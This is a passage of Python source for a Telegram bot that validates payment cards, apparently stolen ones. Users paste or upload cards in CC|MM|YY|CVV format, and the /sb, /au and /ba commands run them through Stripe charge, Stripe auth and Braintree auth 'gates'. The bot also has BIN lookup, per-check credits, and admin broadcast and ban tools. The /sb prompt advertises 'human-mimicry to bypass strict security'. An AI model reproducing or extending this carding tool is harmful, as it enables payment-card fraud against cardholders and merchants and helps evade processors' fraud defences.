        await update.message.reply_text(f"❌ Error: {str(e)}")

async def onlineusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /onlineusers command - Admin only. Show users active in last 5 minutes."""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only command!")
        return
    
    if not user_tracking:
        await update.message.reply_text("📭 No users tracked yet!")
        return
    
    # Find online users (active in last 5 minutes)
    online_users = []
    for uid, stats in user_tracking.items():
        last_active = stats.get('last_active', '')
        if is_user_online(last_active):
            online_users.append((uid, stats))
    
    if not online_users:
        await update.message.reply_text(
            "🔴 NO ONLINE USERS 🔴\n\n"
            "No users have been active in the last 5 minutes."
        )
        return
    
    msg = "🟢 ONLINE USERS 🟢\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for i, (uid, stats) in enumerate(online_users, 1):
        username = stats.get('username') or 'N/A'
        first_name = stats.get('first_name') or 'Unknown'
        last_active = stats.get('last_active', '')
        time_ago = get_time_ago(last_active)
        
        msg += f"{i}. 🟢 {first_name} (@{username})\n"
        msg += f"   ID: `{uid}` | Active: {time_ago}\n"
        msg += "   ─────────────────\n"
    
    msg += f"\n✨ Total Online: {len(online_users)} users"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

# ============ BROADCAST SYSTEM ============

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /broadcast command - Admin only. Broadcast message to all tracked users."""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"🚫 ACCESS DENIED - Admin only!\nContact: {ADMIN_USERNAME}")
        return
    
    # Check if there's a message to broadcast
    if not context.args and not update.message.reply_to_message:
        await update.message.reply_text(
            "📢 BROADCAST USAGE\n\n"
            "To broadcast text:\n"
            "/broadcast Your message here\n\n"
            "To broadcast photo:\n"
            "Reply to a photo with /broadcast\n"
            "Or reply with /broadcast caption text\n\n"
            "📊 Users to receive: " + str(len(user_tracking))
        )
        return
    
    if not user_tracking:
        await update.message.reply_text("📭 No users to broadcast to!")
        return
    
    # Prepare broadcast
    broadcast_text = ' '.join(context.args) if context.args else None
    reply_msg = update.message.reply_to_message
    
    success_count = 0
    fail_count = 0
    
    status_msg = await update.message.reply_text(f"📢 Broadcasting to {len(user_tracking)} users...")
    
    for uid_str in user_tracking.keys():
        try:
            uid = int(uid_str)
            
            if reply_msg and reply_msg.photo:
                # Send photo with optional caption
                caption = broadcast_text or reply_msg.caption or ""
                await context.bot.send_photo(
                    chat_id=uid,
                    photo=reply_msg.photo[-1].file_id,
                    caption=f"📢 BROADCAST\n\n{caption}\n\n— Admin {ADMIN_USERNAME}"
                )
            elif reply_msg and reply_msg.document:
                # Send document
                caption = broadcast_text or reply_msg.caption or ""
                await context.bot.send_document(
                    chat_id=uid,
                    document=reply_msg.document.file_id,
                    caption=f"📢 BROADCAST\n\n{caption}\n\n— Admin {ADMIN_USERNAME}"
                )
            elif broadcast_text:
                # Send text message
                await context.bot.send_message(
                    chat_id=uid,
                    text=f"📢 BROADCAST\n\n{broadcast_text}\n\n— Admin {ADMIN_USERNAME}"
                )
            else:
                fail_count += 1
                continue
            
            success_count += 1
            await asyncio.sleep(0.1)  # Rate limiting
            
        except Exception as e:
            fail_count += 1
            print(f"Broadcast failed for {uid_str}: {e}")
    
    await status_msg.edit_text(
        f"📢 BROADCAST COMPLETE\n\n"
        f"✅ Sent: {success_count}\n"
        f"❌ Failed: {fail_count}\n"
        f"📊 Total: {len(user_tracking)}"
    )

async def sendto_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /sendto command - Admin only. Send message to specific user."""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"🚫 ACCESS DENIED - Admin only!\nContact: {ADMIN_USERNAME}")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "📨 SEND TO USER USAGE\n\n"
            "/sendto <user_id> <message>\n\n"
            "Example:\n"
            "/sendto 123456789 Hello, this is a message!\n\n"
            "To send photo:\n"
            "Reply to a photo with /sendto <user_id>"
        )
        return
    
    try:
        target_uid = int(context.args[0])
        message_text = ' '.join(context.args[1:])
        reply_msg = update.message.reply_to_message
        
        try:
            if reply_msg and reply_msg.photo:
                # Send photo
                caption = message_text or reply_msg.caption or ""
                await context.bot.send_photo(
                    chat_id=target_uid,
                    photo=reply_msg.photo[-1].file_id,
                    caption=f"📨 Message from Admin\n\n{caption}\n\n— {ADMIN_USERNAME}"
                )
            elif reply_msg and reply_msg.document:
                # Send document
                caption = message_text or reply_msg.caption or ""
                await context.bot.send_document(
                    chat_id=target_uid,
                    document=reply_msg.document.file_id,
                    caption=f"📨 Message from Admin\n\n{caption}\n\n— {ADMIN_USERNAME}"
                )
            else:
                # Send text
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=f"📨 Message from Admin\n\n{message_text}\n\n— {ADMIN_USERNAME}"
                )
            
            # Get user info
            user_info = user_tracking.get(str(target_uid), {})
            user_name = user_info.get('first_name', 'Unknown')
            
            await update.message.reply_text(
                f"✅ Message sent successfully!\n\n"
                f"👤 To: {user_name}\n"
                f"🆔 ID: {target_uid}"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to send message!\n\nError: {str(e)}")
            
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Please provide a valid number.")


async def punish_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /ban, /suspend, /unban commands for both users and groups."""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only!")
        return
        
    cmd_parts = update.message.text.split()
    if len(cmd_parts) < 2:
        await update.message.reply_text(
            "Usage:\n"
            "/ban <id>\n"
            "/suspend <id> <time (e.g. 1d 2h)>\n"
            "/unban <id>\n\n"
            "💡 ID can be User ID (e.g. 12345) or Group ID (e.g. -10012345)"
        )
        return
        
    command = cmd_parts[0].replace('/', '').lower()
    target_id = cmd_parts[1]
    
    is_group = target_id.startswith('-')
    
    if is_group:
        if target_id not in group_tracking:
            await update.message.reply_text(f"❌ Group `{target_id}` not found in database!")
            return
        stats = group_tracking[target_id]
        save_func = save_group_tracking
        type_str = "Group"
    else:
        if target_id not in user_tracking:
            await update.message.reply_text(f"❌ User `{target_id}` not found in database!")
            return
        stats = user_tracking[target_id]
        save_func = save_user_tracking
        type_str = "User"
    
    if command == "ban":
        stats['banned'] = True
        stats['suspended_until'] = None
        save_func()
        await update.message.reply_text(f"✅ {type_str} `{target_id}` has been **BANNED PERMANENTLY**.")
        try:
            msg = "🚫 **THIS GROUP HAS BEEN PERMANENTLY BANNED!**\nThe bot will no longer process requests here." if is_group else "🚫 **YOU HAVE BEEN PERMANENTLY BANNED!**\nYou can no longer use this bot."
            await context.bot.send_message(chat_id=int(target_id), text=msg, parse_mode='Markdown')
        except: pass
        
    elif command == "suspend":
        if len(cmd_parts) < 3:
            await update.message.reply_text("❌ Specify duration! Example: `/suspend -100123 2h 30m`")
            return
        duration_str = " ".join(cmd_parts[2:])
        minutes = parse_time_duration(duration_str)
        if minutes is None or minutes <= 0:
            await update.message.reply_text("❌ Invalid duration format! Use `1d 2h 30m`.")
            return
            
        until = get_ist_time() + timedelta(minutes=minutes)
        stats['suspended_until'] = until.isoformat()
        stats['banned'] = False
        save_func()
        
        await update.message.reply_text(f"✅ {type_str} `{target_id}` suspended for `{duration_str}`.\nUntil: `{until.strftime('%Y-%m-%d %I:%M:%S %p')}`")
        try:
            msg = (f"⏳ **THIS GROUP HAS BEEN SUSPENDED!**\n\nDuration: `{duration_str}`\nUntil: `{until.strftime('%Y-%m-%d %I:%M:%S %p')}`" 
                   if is_group else 
                   f"⏳ **YOU HAVE BEEN SUSPENDED!**\n\nDuration: `{duration_str}`\nUntil: `{until.strftime('%Y-%m-%d %I:%M:%S %p')}`")
            await context.bot.send_message(chat_id=int(target_id), text=msg, parse_mode='Markdown')
        except: pass
        
    elif command == "unban":
        stats['banned'] = False
        stats['suspended_until'] = None
        save_func()
        await update.message.reply_text(f"✅ {type_str} `{target_id}` has been **UNBANNED**.")
        try:
            msg = "✅ **GROUP BAN HAS BEEN REMOVED!**\nThe bot is now active here again." if is_group else "✅ **YOUR BAN HAS BEEN REMOVED!**\nYou can use the bot again."
            await context.bot.send_message(chat_id=int(target_id), text=msg, parse_mode='Markdown')
        except: pass
        

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE, page=1) -> None:
    """Handle /admin command. Page argument used for pagination."""
    # ... logic handled via callback mainly now
    """Handle /admin command - Show admin panel with buttons."""
    user_id = update.effective_user.id
    if not is_admin(user_id): return
    
    await show_admin_panel(update, context, page=1)

async def show_admin_panel(update_or_query, context, page=1):
    """Helper to render admin panel pages."""
    auth_status = is_authorization_enabled()
    maintenance_status = is_maintenance_mode()
    sb_privacy_status = is_sb_private()
    online_count = sum(1 for stats in user_tracking.values() if is_user_online(stats.get('last_active', '')))
    
    keyboard = []
    
    if page == 1:
        auth_button_text = "🔓 Disable Auth" if auth_status else "🔐 Enable Auth"
        maint_button_text = "🛠️ Disable Maint" if maintenance_status else "🚧 Enable Maint"
        sb_button_text = "🔒 Make /sb Public" if sb_privacy_status else "🔓 Make /sb Private"
        
        keyboard = [
            [
                InlineKeyboardButton("👤 Add User", callback_data="admin_adduser"),
                InlineKeyboardButton("🗑️ Remove User", callback_data="admin_removeuser")
            ],
            [
                InlineKeyboardButton("📋 List Authorized", callback_data="admin_listusers"),
                InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")
            ],
            [
                InlineKeyboardButton("🟢 Online Users", callback_data="admin_onlineusers"),
                InlineKeyboardButton("🔍 User Lookup", callback_data="admin_userlookup")
            ],
            [
                InlineKeyboardButton(sb_button_text, callback_data="admin_togglesb"),
                InlineKeyboardButton("📨 Send to User", callback_data="admin_sendto")
            ],
            [
                InlineKeyboardButton(auth_button_text, callback_data="admin_toggleauth"),
                InlineKeyboardButton(maint_button_text, callback_data="admin_togglemaint")
            ],
            [
                InlineKeyboardButton("➡️ Next Page", callback_data="admin_page_2"),
                InlineKeyboardButton("❌ Close Panel", callback_data="admin_close")
            ]
        ]
        
        auth_mode_text = "🔐 ENABLED (Private Mode)" if auth_status else "🔓 DISABLED (All Users Allowed)"
        
        text = (
            f"👑🔥 ADMIN CONTROL PANEL 🔥👑\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👋 Welcome Admin! 👋\n"
            f"🔒 Authorized Users: {len(authorized_users)}\n"
            f"📊 Tracked Users: {len(user_tracking)}\n"
            f"🟢 Online Now: {online_count}\n"
            f"🔑 Auth Mode: {auth_mode_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 Select an action below:"
        )
        
    elif page == 2:
        # Additional Admin Options Page
        keyboard = [
            [
                InlineKeyboardButton("📊 All Users", callback_data="admin_allusers"),
                InlineKeyboardButton("👥 All Groups", callback_data="admin_allgroups")
            ],
            [
                InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
                InlineKeyboardButton("🚫 Punish User", callback_data="admin_punish")
            ],
            [
                InlineKeyboardButton("⬅️ Prev Page", callback_data="admin_page_1"),
                InlineKeyboardButton("❌ Close", callback_data="admin_close")
            ]
        ]
        
        text = (
            f"⚙️ **ADMIN OPTIONS (Page 2)** ⚙️\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 User Management & Broadcasting\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Select an action below:"
        )

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update_or_query, 'edit_message_text'):
        await update_or_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update_or_query.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')


async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /wallet command to show user credits and shortlink option."""
    user_id = update.effective_user.id
    user = update.effective_user
    
    # Username Check
    if not user.username:
        await update.message.reply_text("❌ You must have a Telegram username to use this bot.")
        return
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
    # Punishment Check
    punished, reason = is_user_punished(user_id)
    if punished:
        await update.message.reply_text(reason, parse_mode='Markdown')
        return
        
    stats = get_user_stats(user_id)
    increment_feature_usage(user_id, 'wallet')
    
    credits = stats.get('credits', 0)
    
    keyboard = [
        [InlineKeyboardButton("➕ Get 500 Free Credits (Shortlink)", callback_data="get_credits")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    wallet_text = (
        f"💳 **YOUR WALLET** 💳\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: {update.effective_user.first_name}\n"
        f"🆔 ID: `{user_id}`\n\n"
        f"💰 **Balance:** `{credits}` credits\n"
        f"📅 **Daily Reset:** 12:00 AM\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 1 Credit = 1 Card Check\n"
        f"Finish your credits? Click below to get 500 more!"
    )
    
    await update.message.reply_text(wallet_text, reply_markup=reply_markup, parse_mode='Markdown')

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /bin command for BIN lookup."""
    user_id = update.effective_user.id
    user = update.effective_user
    
    # Username Check
    if not user.username:
        await update.message.reply_text("❌ You must have a Telegram username to use this bot.")
        return
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
    # Punishment Check
    punished, reason = is_user_punished(user_id)
    if punished:
        await update.message.reply_text(reason, parse_mode='Markdown')
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return
        
    # Track user activity
    update_user_activity(user_id, username=user.username, first_name=user.first_name, last_name=user.last_name)
    increment_feature_usage(user_id, 'bin_lookup', chat_id=chat_id)
    
    if not is_authorized(user_id):
        await update.message.reply_text("🚫 **ACCESS DENIED** - Unauthorized user!")
        return
    
    try:
        # Get BIN number from command
        if context.args:
            bin_input = context.args[0]
        else:
            await update.message.reply_text(
                "❌ Please provide a BIN number!\n\n"
                "Usage: `/bin 434527`\n"
                "Example: `/bin 411111`",
                parse_mode='Markdown'
            )
            return
        
        # Validate BIN (should be 6 digits, but accept 4+ for partial lookup)
        bin_clean = ''.join(filter(str.isdigit, bin_input))
        if len(bin_clean) < 4:
            await update.message.reply_text(
                "❌ Invalid BIN number!\n\n"
                "Please provide at least 4 digits.\n"
                "Example: `/bin 434527`",
                parse_mode='Markdown'
            )
            return
        
        # Take first 6 digits for lookup
        bin_number = bin_clean[:6]
        
        # Send "looking up" message
        await update.message.reply_text(f"🔍 Looking up BIN: `{bin_number}`...", parse_mode='Markdown')
        
        # Perform BIN lookup
        bin_data = await bin_lookup(bin_number)
        
        # Debug: Print the raw API response
        print(f"DEBUG: BIN {bin_number} API response: {bin_data}")
        
        # Format and send result
        result = format_bin_info(bin_data, bin_number)
        await update.message.reply_text(result, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ Error during BIN lookup: {str(e)}\n\n"
            "Please try again later.",
            parse_mode='Markdown'
        )
        return
        
async def sb_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /sb command."""
    user_id = update.effective_user.id
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The /sb gate is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
    
    # Authorization Check - Block unauthorized users
    if is_authorization_enabled() and not is_user_authorized(user_id):
        await update.message.reply_text(
            "🚫 **ACCESS DENIED** 🚫\n\n"
            "❌ You are not authorized to use this bot.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return

    # Punishment Check
    punished, reason = is_user_punished(user_id)
    if punished:
        await update.message.reply_text(reason, parse_mode='Markdown')
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return
            
            
    # Gateway Status Check
    if not is_gateway_enabled('sb') and not is_admin(user_id):
        await update.message.reply_text(
            "🔴 **GATEWAY DISABLED** 🔴\n\n"
            "⚡ **Stripe Charge ($5)** gate is currently disabled.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return


    increment_feature_usage(user_id, 'stripe_charge_sb', chat_id=chat_id)

    # If cards are provided directly with the command
    if context.args:
        full_text = " ".join(context.args)
        import re
        cards = re.findall(r'\d{13,19}[^\d]\d{1,2}[^\d]\d{2,4}[^\d]\d{3,4}', full_text)
        if cards:
            # Create temp file and start checking
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
                temp_file_path = temp_file.name
            asyncio.create_task(start_checking(update, context, temp_file_path, cards, gate_priority='sb'))
            return

    await update.message.reply_text(
        "⚡ **STRIPE CHARGE GATE ($5) (/sb) ACTIVE** ⚡\n\n"
        "🛡️ **Safety Protocol:** 1-Minute Delay Active\n"
        "⏳ *This gate uses advanced human-mimicry to bypass strict security. Please be patient - quality over speed!*\n\n"
        "Please send your cards now!\n"
        "• Paste single card\n"
        "• Paste multiple cards\n"
        "• Or upload a .txt file\n\n"
        "**Format:** `CC|MM|YY|CVV`",
        parse_mode='Markdown'
    )
    # Set a flag to catch the next message for /sb
    context.user_data['waiting_for_sb'] = True


# Note: The main start_checking function is defined later in this file
# DO NOT add a duplicate function here

async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /au command - Stripe Auth gate using new API."""
    user_id = update.effective_user.id
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The /au gate is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
    
    # Authorization Check - Block unauthorized users
    if is_authorization_enabled() and not is_user_authorized(user_id):
        await update.message.reply_text(
            "🚫 **ACCESS DENIED** 🚫\n\n"
            "❌ You are not authorized to use this bot.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return

    # Punishment Check
    punished, reason = is_user_punished(user_id)
    if punished:
        await update.message.reply_text(reason, parse_mode='Markdown')
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return

    # Gateway Status Check
    if not is_gateway_enabled('au') and not is_admin(user_id):
        await update.message.reply_text(
            "🔴 **GATEWAY DISABLED** 🔴\n\n"
            "💎 **Stripe Auth** gate is currently disabled.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return

    increment_feature_usage(user_id, 'stripe_auth_au', chat_id=chat_id)

    # If cards are provided directly with the command
    if context.args:
        full_text = " ".join(context.args)
        import re
        cards = re.findall(r'\d{13,19}[^\d]\d{1,2}[^\d]\d{2,4}[^\d]\d{3,4}', full_text)
        if cards:
            # Create temp file and start checking
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
                temp_file_path = temp_file.name
            asyncio.create_task(start_checking(update, context, temp_file_path, cards, gate_priority='au'))
            return

    await update.message.reply_text(
        "💎 **STRIPE AUTH GATE (/au) ACTIVE** 💎\n\n"
        "Please send your cards now!\n"
        "• Paste single card\n"
        "• Paste multiple cards\n"
        "• Or upload a .txt file\n\n"
        "**Format:** `CC|MM|YY|CVV`",
        parse_mode='Markdown'
    )
    # Set a flag to catch the next message for /au
    context.user_data['waiting_for_au'] = True


async def ba_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /ba command - Braintree Auth gate using new API."""
    user_id = update.effective_user.id
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The /ba gate is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
    
    # Authorization Check - Block unauthorized users
    if is_authorization_enabled() and not is_user_authorized(user_id):
        await update.message.reply_text(
            "🚫 **ACCESS DENIED** 🚫\n\n"
            "❌ You are not authorized to use this bot.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return

    # Punishment Check
    punished, reason = is_user_punished(user_id)
    if punished:
        await update.message.reply_text(reason, parse_mode='Markdown')
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return

    # Gateway Status Check
    if not is_gateway_enabled('ba') and not is_admin(user_id):
        await update.message.reply_text(
            "🔴 **GATEWAY DISABLED** 🔴\n\n"
            "🔐 **Braintree Auth** gate is currently disabled.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return

    increment_feature_usage(user_id, 'braintree_auth_ba', chat_id=chat_id)

    # If cards are provided directly with the command
    if context.args:
        full_text = " ".join(context.args)
        import re
        cards = re.findall(r'\d{13,19}[^\d]\d{1,2}[^\d]\d{2,4}[^\d]\d{3,4}', full_text)
        if cards:
            # Create temp file and start checking
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
                temp_file_path = temp_file.name
            asyncio.create_task(start_checking(update, context, temp_file_path, cards, gate_priority='ba'))
            return

    await update.message.reply_text(
        "🔐 **BRAINTREE AUTH GATE (/ba) ACTIVE** 🔐\n\n"
        "Please send your cards now!\n"
        "• Paste single card\n"
        "• Paste multiple cards\n"
        "• Or upload a .txt file\n\n"
        "**Format:** `CC|MM|YY|CVV`",
        parse_mode='Markdown'
    )
    # Set a flag to catch the next message for /ba
    context.user_data['waiting_for_ba'] = True

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /stop command to stop all active checking sessions for the user."""
    user_id = update.effective_user.id
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return

    # Track feature usage
    increment_feature_usage(user_id, 'stop', chat_id=chat_id)
    
    if not is_authorized(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Unauthorized user!")
        return
    
    # Find active sessions for this user (including completed ones that haven't been cleaned up)
    user_sessions = [sid for sid, session in checking_sessions.items() 
                    if session['user_id'] == user_id and (session['active'] or not session.get('completed', False))]
    
    print(f"DEBUG: /stop command - Found {len(user_sessions)} sessions for user {user_id}")
    
    if not user_sessions:
        await update.message.reply_text(
            "ℹ️ No Active Sessions\n\n"
            "You don't have any active card checking sessions to stop.\n"
            "Start checking some cards first!",
            parse_mode='Markdown'
        )
        return
    
    # Stop all user sessions
    stopped_count = 0
    for session_id in user_sessions:
        if not checking_sessions[session_id].get('completed', False):
            checking_sessions[session_id]['active'] = False
            if session_id in paused_sessions:
                paused_sessions.remove(session_id)
            stopped_count += 1
            print(f"DEBUG: Stopped session {session_id}")
        else:
            print(f"DEBUG: Session {session_id} already completed")
    
    await update.message.reply_text(
        f"⏹️ ALL SESSIONS STOPPED ⏹️\n\n"
        f"🛑 Stopped {stopped_count} active checking session(s).\n"
        f"📊 All processes have been terminated.\n\n"
        f"🔄 You can start new checks anytime!",
        parse_mode='Markdown'
    )

async def pause_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /pause command to pause all active checking sessions for the user."""
    user_id = update.effective_user.id
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return

    # Track feature usage
    increment_feature_usage(user_id, 'pause', chat_id=chat_id)
    
    if not is_authorized(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Unauthorized user!")
        return
    
    # Find active sessions for this user
    user_sessions = [sid for sid, session in checking_sessions.items() 
                    if session['user_id'] == user_id and session['active']]
    
    print(f"DEBUG: /pause command - Found {len(user_sessions)} active sessions for user {user_id}")
    
    if not user_sessions:
        await update.message.reply_text(
            "ℹ️ No Active Sessions\n\n"
            "You don't have any active card checking sessions to pause.\n"
            "Start checking some cards first!",
            parse_mode='Markdown'
        )
        return
    
    # Pause all user sessions
    paused_count = 0
    already_paused = 0
    
    for session_id in user_sessions:
        if session_id not in paused_sessions:
            paused_sessions.add(session_id)
            paused_count += 1
            print(f"DEBUG: Paused session {session_id}")
        else:
            already_paused += 1
    
    if paused_count > 0:
        status_text = f"⏸️ SESSIONS PAUSED ⏸️\n\n"
        status_text += f"🔄 Paused {paused_count} active session(s).\n"
        if already_paused > 0:
            status_text += f"⚠️ {already_paused} session(s) were already paused.\n"
        status_text += f"📊 Progress is saved and can be resumed.\n\n"
        status_text += f"💡 Commands:\n"
        status_text += f"• Use `/resume` to resume all paused sessions\n"
        status_text += f"• Use `/stop` to terminate all sessions\n"
        status_text += f"• Or use the control buttons in the checking messages"
    else:
        status_text = f"⚠️ All Sessions Already Paused\n\n"
        status_text += f"All your active sessions are already paused.\n"
        status_text += f"Use `/resume` to continue checking."
    
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /resume command to resume all paused checking sessions for the user."""
    user_id = update.effective_user.id
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return

    # Track feature usage
    increment_feature_usage(user_id, 'resume', chat_id=chat_id)
    
    if not is_authorized(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Unauthorized user!")
        return
    
    # Find paused sessions for this user
    user_paused_sessions = [sid for sid in paused_sessions 
                           if sid in checking_sessions and checking_sessions[sid]['user_id'] == user_id]
    
    print(f"DEBUG: /resume command - Found {len(user_paused_sessions)} paused sessions for user {user_id}")
    
    if not user_paused_sessions:
        await update.message.reply_text(
            "ℹ️ No Paused Sessions\n\n"
            "You don't have any paused card checking sessions to resume.\n"
            "Your sessions might be completed or stopped.",
            parse_mode='Markdown'
        )
        return
    
    # Resume all paused sessions
    resumed_count = 0
    for session_id in user_paused_sessions:
        paused_sessions.remove(session_id)
        resumed_count += 1
        print(f"DEBUG: Resumed session {session_id}")
    
    await update.message.reply_text(
        f"▶️ SESSIONS RESUMED ▶️\n\n"
